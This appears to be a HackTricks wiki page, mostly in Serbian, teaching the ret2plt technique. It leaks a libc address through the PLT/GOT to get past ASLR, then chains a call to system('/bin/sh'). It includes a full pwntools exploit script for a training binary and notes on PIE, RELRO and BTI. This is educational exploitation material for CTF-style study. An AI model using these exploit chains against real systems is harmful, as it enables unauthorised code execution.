# Ret2plt

{{#include ../../../banners/hacktricks-training.md}}

## Osnovne informacije

Cilj ove tehnike je da **izvrši leak adrese funkcije iz PLT-a** kako bi se moglo zaobići ASLR. To je zato što, na primer, ako izvršite leak adrese funkcije `puts` iz libc-a, možete potom **izračunati gde je baza `libc`** i izračunati offset-e za pristup drugim funkcijama kao što je **`system`**.

Ovo se može uraditi pomoću `pwntools` payload-a kao ([**from here**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got)):
```python
# 32-bit ret2plt
payload = flat(
b'A' * padding,
elf.plt['puts'],
elf.symbols['main'],
elf.got['puts']
)

# 64-bit
payload = flat(
b'A' * padding,
POP_RDI,
elf.got['puts']
elf.plt['puts'],
elf.symbols['main']
)
```
Note how **`puts`** (using the address from the PLT) is called with the address of `puts` located in the GOT (Global Offset Table). This is because by the time `puts` prints the GOT entry of puts, this **entry will contain the exact address of `puts` in memory**.

Takođe obratite pažnju kako se adresa `main` koristi u exploit-u, pa kada `puts` završi izvršavanje, **binary ponovo poziva `main` umesto da izađe** (tako da leaked address ostane važeća).

> [!CAUTION]
> Obratite pažnju da, da bi ovo radilo, **binary ne sme biti kompajliran sa PIE** ili morate imati **found a leak to bypass PIE** da biste znali adresu PLT, GOT i main. U suprotnom, prvo morate zaobići PIE.

You can find a [**full example of this bypass here**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass). Ovo je bio finalni exploit iz tog **primera**:

<details>
<summary>Full exploit example (ret2plt leak + system)</summary>
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvline()

payload = flat(
'A' * 32,
elf.plt['puts'],
elf.sym['main'],
elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
libc.sym['exit'],
next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```
</details>

## Moderna razmatranja

- **`-fno-plt` builds** (uobičajeno u modernim distribucijama) zamenjuju `call foo@plt` sa `call [foo@got]`. Ako binarni fajl nema `foo@plt` stub, i dalje možete leak the resolved address with `puts(elf.got['foo'])` i zatim **return directly to the GOT entry** (`flat(padding, elf.got['foo'])`) da skočite u libc nakon što lazy binding završi.
- **Full RELRO / `-Wl,-z,now`**: GOT je samo za čitanje, ali ret2plt i dalje radi za leaks zato što samo čitate GOT slot. Ako simbol nikada nije pozvan, vaš prvi ret2plt će takođe izvršiti lazy binding i zatim ispisati razrešen slot.
- **ASLR + PIE**: ako je PIE omogućen, prvo leak-ujte jedan code pointer (npr. saved return address, function pointer, ili `.plt` entry putem drugog format‑string/infoleak) da izračunate PIE base, zatim izgradite ret2plt lanac sa rebased PLT/GOT adresama.
- **Non‑x86 architectures with BTI/PAC (AArch64)**: PLT entries su validni BTI landing pads (`bti c`), pa pri exploitovanju na BTI‑omogućenim binarima preferirajte skakanje u PLT stub (ili neki drugi BTI‑annotated gadget) umesto direktnog skačanja u libc gadget bez BTI, inače CPU će prijaviti `BRK`/`PAC` greške.
- **Brzi trik za razrešavanje**: ako ciljna funkcija nije još razrešena i treba vam leak u jednom potezu, zaporedno pozovite PLT poziv dva puta: prvo `elf.plt['foo']` (da razreši) pa ponovo `elf.plt['foo']` sa GOT adresom kao argumentom da ispišete sada popunjen slot.

## Other examples & References

- [https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html)
- 64 bit, ASLR enabled but no PIE; prvi korak je da popunite overflow do bajta 0x00 canarya da biste zatim pozvali puts i izvršili leak. Sa canaryjem se kreira ROP gadget koji poziva puts da izvrši leak adrese puts iz GOT-a i potom ROP gadget koji poziva `system('/bin/sh')`.
- [https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html)
- 64 bit, ASLR enabled, nema canarya; stack overflow u main iz pomoćne funkcije. ROP gadget koji poziva puts da izvrši leak adrese puts iz GOT-a i zatim poziva one gadget.

## References

- [MaskRay – All about Procedure Linkage Table](https://maskray.me/blog/2021-09-19-all-about-procedure-linkage-table)

{{#include ../../../banners/hacktricks-training.md}}
